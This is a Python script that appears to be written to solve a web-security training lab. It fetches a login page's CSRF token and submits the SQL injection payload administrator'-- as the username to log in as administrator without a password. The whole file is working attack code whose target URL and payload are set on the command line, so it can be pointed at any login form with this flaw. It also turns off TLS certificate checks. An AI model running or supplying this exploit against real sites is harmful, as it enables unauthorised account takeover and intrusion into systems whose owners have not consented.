import requests
from argparse import ArgumentParser
from bs4 import BeautifulSoup
import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


parser = ArgumentParser()
parser.add_argument("mode", help ="mode", choices=["PROXY_ON","PROXY_OFF"])
parser.add_argument("-u", metavar="url", help="URL of the LAB")
parser.add_argument("-p", metavar="payload", help="Payload",default="administrator'--")


args = parser.parse_args()
if args.u == None:
    print('[+] Provide the URL with "-u" .')
    exit()

proxies = {'http':'http://127.0.0.1:8080',"https":'https://127.0.0.1:8080'}
s=requests.session()

def get_csrf(url):
    if args.mode == "PROXY_ON":
        r=s.get(url,verify=False,proxies=proxies)
    if args.mode == "PROXY_OFF":
        r=s.get(url,verify=False)
    soup = BeautifulSoup(r.text,'lxml')
    if soup.text.__contains__("Server Error:"):
        print("[+] LAB EXPRIED, Restart the LAB")
        exit()
    elif soup.text.__contains__("Internal Server Error"):
        print("[+} The given payload did not work.")
        exit()   
    csrf = soup.find("input")['value']
    return csrf

def url_check(final_url):
    if final_url.__contains__("//"):
        new = final_url.split(".net")
        new_url=new[0]+".net"+new[1].replace("//","/")
    return new_url

def exploit(url,payload):
    uri='/login' 
    final_url=url_check(url+uri)
    print("[+] Login page",final_url)
    csrf = get_csrf(final_url)
    print("[+] CSRF TOKEN :",csrf)
    data = {"csrf":csrf,"username":payload,"password":"anypass"}
    if args.mode == "PROXY_ON":
        r= s.post(final_url,data=data,proxies=proxies)
    if args.mode == "PROXY_OFF":
        r= s.post(final_url,data=data)
    soup1 = BeautifulSoup(r.text,'lxml')
    if soup1.text.__contains__("Log out"):
        print("[+] Sucessfully logged in as administrator.")
    elif soup1.text.__contains__("Invalid username or password."):
        print("[-] The given payload did not work.")
    else:
        print("[-] Some thing went wrong.")
    
    

url =args.u
print("[+] URL : ",url)
payload=args.p
print("[+] Payload : ",payload)
exploit(url,payload)